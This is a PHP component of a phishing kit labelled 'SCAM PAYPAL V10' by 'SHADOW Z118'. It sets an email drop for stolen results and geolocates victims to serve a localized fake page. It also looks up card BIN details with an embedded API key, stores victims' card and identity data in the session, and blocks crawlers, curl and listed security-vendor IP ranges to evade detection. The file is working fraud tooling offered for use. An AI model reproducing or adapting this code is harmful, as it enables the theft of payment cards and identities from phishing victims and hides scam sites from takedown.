<?php

/*   
   _____   _                   _                        ______    __    __     ___  
  / ____| | |                 | |                      |___  /   /_ |  /_ |   / _ \ 
 | (___   | |__     __ _    __| |   ___   __      __      / /    | |   | |   | (_) |
  \___ \  | '_ \   / _` |  / _` |  / _ \  \ \ /\ / /     / /   - | | - | | -  > _ < 
  ____) | | | | | | (_| | | (_| | | (_) |  \ V  V /     / /__  - | | - | | - | (_) |
 |_____/  |_| |_|  \__,_|  \__,_|  \___/    \_/\_/     /_____|   |_|   |_|    \___/ 
                                                                                
                              #=======================#
                              #    SCAM PAYPAL V10    #
                              #      SHADOW Z118      #
                              #=======================#
							  
                $$$$$$$\                     $$$$$$$\           $$\   
                $$  __$$\                    $$  __$$\          $$ |  
                $$ |  $$ |$$$$$$\  $$\   $$\ $$ |  $$ |$$$$$$\  $$ |  
                $$$$$$$  |\____$$\ $$ |  $$ |$$$$$$$  |\____$$\ $$ |  
                $$  ____/ $$$$$$$ |$$ |  $$ |$$  ____/ $$$$$$$ |$$ |  
                $$ |     $$  __$$ |$$ |  $$ |$$ |     $$  __$$ |$$ |  
                $$ |     \$$$$$$$ |\$$$$$$$ |$$ |     \$$$$$$$ |$$ |  
                \__|      \_______| \____$$ |\__|      \_______|\__|  
                                   $$\   $$ |                         
                                   \$$$$$$  |                         
                                    \______/                          
*/

session_start();
$email = "wizzcap11@gmail.com"; // PUT UR FUCKING E-MAIL BRO
$_txt   = 1; 			// {0,1} Text Rezult						  
///////////////////////////////// GET INFO IP ADDRESS /////////////////////////////////

$client  = @$_SERVER['HTTP_CLIENT_IP'];
$forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
$remote  = @$_SERVER['REMOTE_ADDR'];
$result  = "Unknown";
if(filter_var($client, FILTER_VALIDATE_IP)){
    $ip = $client;
}
elseif(filter_var($forward, FILTER_VALIDATE_IP)){
    $_SESSION['_ip_'] = $ip = $forward;
}
else{
    $_SESSION['_ip_'] = $ip = $remote;
}
$ip_data = @json_decode(file_get_contents("http://www.geoplugin.net/json.gp?ip=".$_SESSION['_ip_']));
if($ip_data && $ip_data->geoplugin_countryCode != null){
    $countrycode = $ip_data->geoplugin_countryCode;
}
$ip_data2 = @json_decode(file_get_contents("http://www.geoplugin.net/json.gp?ip=".$_SESSION['_ip_']));
if($ip_data2 && $ip_data2->geoplugin_countryName != null){
    $countryname = $ip_data2->geoplugin_countryName;
}
////////////////////////////////   LANUAGE CHECKER   /////////////////////////////////

if ($_SESSION['_countrycode_'] == "FR" || $_SESSION['_countrycode_'] == "DZ" || $_SESSION['_countrycode_'] == "MA" || $_SESSION['_countrycode_'] == "TN" || $_SESSION['_countrycode_'] == "CD" || $_SESSION['_countrycode_'] == "MG" || $_SESSION['_countrycode_'] == "CM" || $_SESSION['_countrycode_'] == "CA" || $_SESSION['_countrycode_'] == "CI" || $_SESSION['_countrycode_'] == "BF" || $_SESSION['_countrycode_'] == "NE" || $_SESSION['_countrycode_'] == "SN" || $_SESSION['_countrycode_'] == "ML" || $_SESSION['_countrycode_'] == "RW" || $_SESSION['_countrycode_'] == "BE" || $_SESSION['_countrycode_'] == "GF" || $_SESSION['_countrycode_'] == "TD" || $_SESSION['_countrycode_'] == "HT" || $_SESSION['_countrycode_'] == "BI" || $_SESSION['_countrycode_'] == "BJ" || $_SESSION['_countrycode_'] == "CH" || $_SESSION['_countrycode_'] == "TG" || $_SESSION['_countrycode_'] == "CF" || $_SESSION['_countrycode_'] == "CG" || $_SESSION['_countrycode_'] == "GA" || $_SESSION['_countrycode_'] == "KM" || $_SESSION['_countrycode_'] == "GK" || $_SESSION['_countrycode_'] == "DJ" || $_SESSION['_countrycode_'] == "LU" || $_SESSION['_countrycode_'] == "VU" || $_SESSION['_countrycode_'] == "SC" || $_SESSION['_countrycode_'] == "MC") {
    $_SESSION['Z-1-1-8'] = "/fr.php";
} elseif ($_SESSION['_countrycode_'] == "MX" || $_SESSION['_countrycode_'] == "PH" || $_SESSION['_countrycode_'] == "ES" || $_SESSION['_countrycode_'] == "CO" || $_SESSION['_countrycode_'] == "AR" || $_SESSION['_countrycode_'] == "PE" || $_SESSION['_countrycode_'] == "VE" || $_SESSION['_countrycode_'] == "CL" || $_SESSION['_countrycode_'] == "EC" || $_SESSION['_countrycode_'] == "GT" || $_SESSION['_countrycode_'] == "CU" || $_SESSION['_countrycode_'] == "HN" || $_SESSION['_countrycode_'] == "PY" || $_SESSION['_countrycode_'] == "SV" || $_SESSION['_countrycode_'] == "NI" || $_SESSION['_countrycode_'] == "CR" || $_SESSION['_countrycode_'] == "UY") {
    $_SESSION['Z-1-1-8'] = "/es.php";
} elseif ($_SESSION['_countrycode_'] == "IT" || $_SESSION['_countrycode_'] == "SM") {
   $_SESSION['Z-1-1-8'] = "/it.php";
} elseif ($_SESSION['_countrycode_'] == "RU" || $_SESSION['_countrycode_'] == "BY" || $_SESSION['_countrycode_'] == "KZ" || $_SESSION['_countrycode_'] == "KG" || $_SESSION['_countrycode_'] == "TJ") {
    $_SESSION['Z-1-1-8'] = "/ru.php";
} elseif ($_SESSION['_countrycode_'] == "PT" || $_SESSION['_countrycode_'] == "BR" || $_SESSION['_countrycode_'] == "AO" || $_SESSION['_countrycode_'] == "MZ" || $_SESSION['_countrycode_'] == "MO") {
    $_SESSION['Z-1-1-8'] = "/pt.php";
} elseif ($_SESSION['_countrycode_'] == "TR" || $_SESSION['_countrycode_'] == "cy") {
    $_SESSION['Z-1-1-8'] = "/tr.php";
} elseif ($_SESSION['_countrycode_'] == "PL") {
    $_SESSION['Z-1-1-8'] = "/pl.php";
} elseif ($_SESSION['_countrycode_'] == "NO") {
    $_SESSION['Z-1-1-8'] = "/no.php";
} elseif ($_SESSION['_countrycode_'] == "NL" || $_SESSION['_countrycode_'] == "AW") {
    $_SESSION['Z-1-1-8'] = "/nl.php";
} elseif ($_SESSION['_countrycode_'] == "DE" || $_SESSION['_countrycode_'] == "CH") {
    $_SESSION['Z-1-1-8'] = "/de.php";
}else {
   $_SESSION['Z-1-1-8'] = "/en.php";
}

///////////////////////////////// BIN CHECKER  /////////////////////////////////

$Bin     = str_replace(' ', '', $_SESSION['_cardnumber_']);
$Bin     = substr($Bin, 0, 6);
$Z118     = @json_decode(file_get_contents("https://api.bincodes.com/bin-checker.php?api_key=df020228e08ef430bced501ca2084b79&bin=".$Bin."&format=json"));
$Card     = $Z118->card;
$Bank     = $Z118->bank;
$Type     = $Z118->type;
$Level    = $Z118->level;
$Country  = $Z118->country;
$CntrCode = $Z118->countrycode;

///////////////////////////////// SESSION  /////////////////////////////////

$_SESSION['_country_']     = $Country;
$_SESSION['_cntrcode_']    = $CntrCode;
$_SESSION['_cc_brand_']    = $Card;
$_SESSION['_cc_bank_']     = $Bank;
$_SESSION['_cc_type_']     = $Type;
$_SESSION['_cc_class_']    = $Level;
$_SESSION['_countryname_'] = $countryname ;
$_SESSION['_countrycode_'] = $countrycode ;
$_SESSION['_ccglobal_']    = $_SESSION['_cc_brand_']." ".$_SESSION['_cc_type_']." ".$_SESSION['_cc_class_'];
$_SESSION['_VBV_']         = $_SESSION['_c_type_'] == "VISA" || $_SESSION['_c_type_'] =="VISA ELECTRON" || $_SESSION['_c_type_'] =="MASTERCARD" || $_SESSION['_c_type_'] =="MAESTRO";
$_SESSION['_CCV_']         = $_SESSION['_c_type_'] == "AMEX" || $_SESSION['_c_type_'] =="DISCOVER" || $_SESSION['_c_type_'] =="JCB" || $_SESSION['_c_type_'] =="DINERS CLUB";
$Account_Owner   = $_SESSION['_fullName_'];
$AccountOwner    = strtoupper($Account_Owner);
if($_SESSION['_cc_type_'] == "DEBIT"){
	$TYPES = "Debit";
}
elseif($_SESSION['_cc_type_'] == "CREDIT"){
	$TYPES = "Credit";
}
$_SESSION['_global_'] = $_SESSION['_cntrcode_']." ".$_SESSION['_ip_'];

///////////////////// BOTS DIAL TEBI -__-  //////////////////////////
$hostname = gethostbyaddr($_SERVER['REMOTE_ADDR']);
$blocked_words = 
    array("'Googlebot', 
        'Baiduspider', 
        'ia_archiver',
        'R6_FeedFetcher', 
        'NetcraftSurveyAgent', 
        'Sogou web spider',
        'bingbot', 
        'Yahoo! Slurp', 
        'facebookexternalhit', 
        'PrintfulBot',
        'msnbot', 
        'Twitterbot', 
        'UnwindFetchor', 
        'urlresolver', 
        'Butterfly', 
        'TweetmemeBot',
        'PaperLiBot',
        'MJ12bot',
        'AhrefsBot',
        'Exabot',
        'Ezooms',
        'YandexBot',
        'SearchmetricsBot',
        'picsearch',
        'TweetedTimes Bot',
        'QuerySeekerSpider',
        'ShowyouBot',
        'woriobot',
        'merlinkbot',
        'BazQuxBot',
        'Kraken',
        'SISTRIX Crawler',
        'R6_CommentReader',
        'magpie-crawler',
        'GrapeshotCrawler',
        'PercolateCrawler',
        'MaxPointCrawler',
        'R6_FeedFetcher',
        'NetSeer crawler',
        'grokkit-crawler',
        'SMXCrawler',
        'PulseCrawler',
        'Y!J-BRW',
        '80legs.com/webcrawler',
        'Mediapartners-Google', 
        'Spinn3r', 
        'InAGist', 
        'Python-urllib', 
        'NING', 
        'TencentTraveler',
        'Feedfetcher-Google', 
        'mon.itor.us', 
        'spbot', 
        'Feedly',
        'bot',
        'curl',
        spider,
        crawler");
foreach($blocked_words as $word) {
    if (substr_count($hostname, $word) > 0) {
    header("HTTP/1.0 404 Not Found");
        echo "HELLOOOOO BITCHES | I FUCKING LOVE YOU HAHAHAHAHAHAHA <3 |  TRY BYPASS ME NEXT TIME BB <3. ";

    }  
}
$bannedIP = array("^81.161.59.*", "^66.135.200.*", "^66.102.*.*", "^38.100.*.*", "^107.170.*.*", "^149.20.*.*", "^38.105.*.*", "^74.125.*.*",  "^66.150.14.*", "^54.176.*.*", "^38.100.*.*", "^184.173.*.*", "^66.249.*.*", "^128.242.*.*", "^72.14.192.*", "^208.65.144.*", "^74.125.*.*", "^209.85.128.*", "^216.239.32.*", "^74.125.*.*", "^207.126.144.*", "^173.194.*.*", "^64.233.160.*", "^72.14.192.*", "^66.102.*.*", "^64.18.*.*", "^194.52.68.*", "^194.72.238.*", "^62.116.207.*", "^212.50.193.*", "^69.65.*.*", "^50.7.*.*", "^131.212.*.*", "^46.116.*.* ", "^62.90.*.*", "^89.138.*.*", "^82.166.*.*", "^85.64.*.*", "^85.250.*.*", "^89.138.*.*", "^93.172.*.*", "^109.186.*.*", "^194.90.*.*", "^212.29.192.*", "^212.29.224.*", "^212.143.*.*", "^212.150.*.*", "^212.235.*.*", "^217.132.*.*", "^50.97.*.*", "^217.132.*.*", "^209.85.*.*", "^66.205.64.*", "^204.14.48.*", "^64.27.2.*", "^67.15.*.*", "^202.108.252.*", "^193.47.80.*", "^64.62.136.*", "^66.221.*.*", "^64.62.175.*", "^198.54.*.*", "^192.115.134.*", "^216.252.167.*", "^193.253.199.*", "^69.61.12.*", "^64.37.103.*", "^38.144.36.*", "^64.124.14.*", "^206.28.72.*", "^209.73.228.*", "^158.108.*.*", "^168.188.*.*", "^66.207.120.*", "^167.24.*.*", "^192.118.48.*", "^67.209.128.*", "^12.148.209.*", "^12.148.196.*", "^193.220.178.*", "68.65.53.71", "^198.25.*.*", "^64.106.213.*", "^91.103.66.*", "^208.91.115.*", "^199.30.228.*");
if(in_array($_SERVER['REMOTE_ADDR'],$bannedIP)) {
     header('HTTP/1.0 404 Not Found');
     exit();
} else {
     foreach($bannedIP as $ip) {
          if(preg_match('/' . $ip . '/',$_SERVER['REMOTE_ADDR'])){
               header('HTTP/1.0 404 Not Found');
               echo "HELLOOOOO BITCHES | I FUCKING LOVE YOU HAHAHAHAHAHAHA <3 |  TRY BYPASS ME NEXT TIME BB <3. ";
          }
     }
}
?>